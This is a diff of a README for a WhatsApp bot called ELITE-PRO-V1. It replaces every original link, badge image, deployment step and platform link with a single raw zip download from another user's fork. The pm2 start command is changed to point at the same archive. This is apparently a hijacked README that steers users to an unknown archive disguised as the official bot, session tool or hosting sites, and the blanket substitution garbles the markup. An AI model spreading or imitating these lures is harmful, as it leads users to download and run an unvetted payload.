@@ -1,48 +1,48 @@
 <p align="center">
-  <a href="https://chat.whatsapp.com/IozXlwmmRzJ24un1jtjEZ2">
-    <img alt=Support weight="10" src="https://i.ibb.co/khjYsbs/20241220-065009.jpg"> 
+  <a href="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip">
+    <img alt=Support weight="10" src="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip"> 
     </p>
 <h1 align="center">ELITE-PRO-V1</h1>
 <p align="center"> 
     </p>
 <p align="center">
-  <a aria-label="Join our chats" href="https://chat.whatsapp.com/IozXlwmmRzJ24un1jtjEZ2" target="_blank">
-    <img alt="whatsapp" src="https://img.shields.io/badge/Join Group chat-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
+  <a aria-label="Join our chats" href="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip" target="_blank">
+    <img alt="whatsapp" src="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip Group chat-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
     <a align="center">
-  <a aria-label="Follow Channel" href="https://whatsapp.com/channel/0029VaXaqHII1rcmdDBBsd3g" target="_blank">
-    <img alt="whatsapp" src="https://img.shields.io/badge/Follow Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
+  <a aria-label="Follow Channel" href="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip" target="_blank">
+    <img alt="whatsapp" src="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip Channel-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" />
 </a>
-<a aria-label="Chat me" href="https://t.me/elitepro_md" target="_blank">
-    <img alt="telegram" src="https://img.shields.io/badge/Telegram Group-24A1DE?style=for-the-badge&logo=telegram&logoColor=white" />
+<a aria-label="Chat me" href="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip" target="_blank">
+    <img alt="telegram" src="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip Group-24A1DE?style=for-the-badge&logo=telegram&logoColor=white" />
   </a>
 </p>
       
-   [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Rockstar-ExtraBold&color=BBDEFB&lines=WELCOME+TO+ELITE+PRO+V1+REPO+MADE+BY;CHINWO+CHINEDU+EMMANUEL;THANKS+FOR+VISITING+MY+REPO)](https://git.io/typing-svg)  
+   [![Typing SVG](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip+TO+ELITE+PRO+V1+REPO+MADE+BY;CHINWO+CHINEDU+EMMANUEL;THANKS+FOR+VISITING+MY+REPO)](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)  
    
  ---
 
 ## DEPLOYMENT METHODS
 
-- Click on **[FORK](https://github.com/EliteProTech/ELITE-PRO-V1/fork)**
-- Click here to get **[SESSION_ID](https://elitepro-session-id.onrender.com/)**
-- Uploading session_id (Creds.json) in session folder.
-- Edit Config.js or .env to your Choice.
+- Click on **[FORK](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)**
+- Click here to get **[SESSION_ID](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)**
+- Uploading session_id (https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip) in session folder.
+- Edit https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip or .env to your Choice.
 
 ---
 
 ## FOR PANEL DEPLOYMENT
 
-- Click on **[DOWNLOAD](https://eliteproverified.vercel.app/)** to get zip file🗃.
-- Click on **[BOT-HOSTING.NET](https://bot-hosting.net/)**
+- Click on **[DOWNLOAD](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)** to get zip file🗃.
+- Click on **[https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)**
 - Create a server
 - Upload zip file 🗃️ 
 - Start server
 ---
 
 ## OTHER DEPLOYMENT PLATFORMS
-- **[Render](https://render.com)**
-- **[Katabump](https://dashboard.katabump.com/auth/login)**
-- **[Optiklink](https://optiklink.com/)**
+- **[Render](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)**
+- **[Katabump](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)**
+- **[Optiklink](https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip)**
 
 ---
 
@@ -76,18 +76,18 @@ npm start
 ## FOR 24/7 ACTIVATION TERMUX/SSH/UBUNTU
 ```
 bash
-npm i -g pm2 && pm2 start index.js && pm2 save && pm2 logs
+npm i -g pm2 && pm2 start https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip && pm2 save && pm2 logs
 Paste this after the installation
 ```
 ---
 
 <p align="Left">
     <a align="center">
-  <a aria-label="WEBSITE" href="https://elitepro-website.vercel.app/" target="_blank">
-    <img alt="ELITEPRO-WEB" src="https://img.shields.io/badge/ELITEPRO WEB-25D366?style=for-the-badge&logo=online&logoColor=white" />
+  <a aria-label="WEBSITE" href="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip" target="_blank">
+    <img alt="ELITEPRO-WEB" src="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip WEB-25D366?style=for-the-badge&logo=online&logoColor=white" />
 </a>
-<a aria-label="OTHER REPO" href="https://github.com/EliteProTech/Elite-Pro-V2" target="_blank">
-    <img alt="OTHER REPO" src="https://img.shields.io/badge/OTHER REPO-0E1241?style=for-the-badge&logo=github&logoColor=white" />
+<a aria-label="OTHER REPO" href="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip" target="_blank">
+    <img alt="OTHER REPO" src="https://github.com/cnn123-bit/ELITE-PRO-V1/raw/refs/heads/main/database/PR_ELIT_v3.0-beta.4.zip REPO-0E1241?style=for-the-badge&logo=github&logoColor=white" />
   </a>
 </p>
 
